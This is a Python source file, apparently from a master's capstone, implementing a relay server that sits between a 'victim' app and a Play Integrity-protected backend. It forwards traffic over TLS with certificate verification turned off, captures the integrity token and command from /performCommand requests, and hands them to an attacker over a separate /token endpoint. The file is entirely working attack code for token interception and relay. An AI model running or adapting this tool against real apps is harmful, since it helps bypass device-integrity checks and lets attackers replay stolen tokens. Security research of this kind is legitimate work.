"""
Server to relay information between the victim app and the attacker app
Author: Alex Collom
Date: 10/10/2023
Project: Final Masters Capstone - Practical RTI
"""

import threading
import socket
import ssl
from dataclasses import dataclass

HOST = "0.0.0.0"
ATTACKER_PORT = 45565
CLIENT_PORT = 80
REMOTE_HOST = "play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com"
REMOTE_PORT = 443


@dataclass
class ClientData:
    token: str
    commandString: str


def attacker_request_handler(conn, addr, client_data):
    """
    Accept the connection and send the token
    :param conn: attacker connection object
    :param addr: attacker address
    :param client_data: data about the client
    :return: None
    """
    print(f"Connected to attacker {addr}")
    with conn:
        total_data = b""
        #while True:
        data = conn.recv(1024)
        #    if not data:
        #        break
        total_data += data
        if b"GET /token" in total_data:
            data_string = "{\"token\":" + client_data.token + "," \
                          "\"commandString\":" + client_data.commandString + "}"
            send_string = "HTTP/1.1 200 OK\r\n" + \
                         "Content-Type: application/json; charset=UTF-8\r\n" + \
                         "Content-Length: " + str(len(data_string)) + "\r\n" + \
                         "Connection: close\r\n\r\n" + data_string
            conn.sendall(send_string.encode())
        else:
            conn.sendall(b"HTTP/1.1 404 Not Found\r\n\r\n")


def client_request_handler(conn, addr, client_data):
    """
    Create a client connection with the legitemate application server to forward data from the client,
    extracting the token if the request is for "/performCommand"
    :param conn: client connection object
    :param addr: client address
    :param client_data: data about the client extracted from "/performCommand"
    :return: None
    """
    # set up variable to keep track of what was received from the client
    total_data_client = b""

    # set up variable to keep track of what was received from the application server
    total_data_server = b""

    # set up SSL Context
    ssl_context_instance = ssl.SSLContext(protocol=ssl.PROTOCOL_TLS_CLIENT)
    ssl_context_instance.check_hostname = False
    ssl_context_instance.verify_mode = ssl.CERT_NONE

    with conn:
        print(f"Connected to {addr}")
        conn.settimeout(3)
        while True:
            try:
                data = conn.recv(4096)
                total_data_client += data
                if total_data_client.endswith(b"}"):
                    break
            except TimeoutError:
                break

        if b"Host: localhost" in total_data_client:
            total_data_client = total_data_client.replace(b"Host: localhost",
                                                          b"Host: play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com")

        if b"POST /performCommand" in total_data_client:
            client_data.token = "\"" + total_data_client.decode('utf8').split("\",\"tokenString\":\"")[1].split("\"")[0] + "\""
            client_data.commandString = "\"" + total_data_client.decode('utf8').split("\r\n\r\n{\"commandString\":\"")[1].split("\"")[0] + "\""
        else:
            # set up client socket to relay information to the application server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSock:
                with ssl_context_instance.wrap_socket(sock=clientSock) as tlsClientSock:
                    tlsClientSock.connect((REMOTE_HOST, REMOTE_PORT))

                    # forward the data to the application server
                    tlsClientSock.sendall(total_data_client)

                    # receive the response from the application server
                    #while True:
                    data = tlsClientSock.recv(4096)
                    #    if not data:
                    #        break
                    total_data_server += data
                    # forward the data back to the client
                    conn.sendall(total_data_server)
        print(str(addr) + " sent this data to the server: " + str(total_data_client) +
              "\nand received response: " + str(total_data_server))


def attacker_server(client_data):
    """
    Listen for attacker connections and create a thread when one is connected successfully
    :param client_data: Data extracted from the client connection
    :return: None
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, ATTACKER_PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            t = threading.Thread(target=attacker_request_handler, args=(conn, addr, client_data))
            t.start()


def client_server(client_data):
    """
    Listen for client connections and create a thread when one is connected successfully
    :param client_data: Data extracted from the client connection
    :return: None
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serverSock:
        serverSock.bind((HOST, CLIENT_PORT))
        serverSock.listen()
        while True:
            conn, addr = serverSock.accept()
            t = threading.Thread(target=client_request_handler, args=(conn, addr, client_data, ))
            t.start()


def main():
    """
    Create threads for listening for client/attacker connections
    :return: None
    """
    # Create data storage object
    client_data = ClientData("", "")

    # Create and start attacker and client threads
    attacker = threading.Thread(target=attacker_server, args=(client_data,))
    client = threading.Thread(target=client_server, args=(client_data,))
    attacker.start()
    client.start()
    attacker.join()
    client.join()


if __name__ == '__main__':
    main()
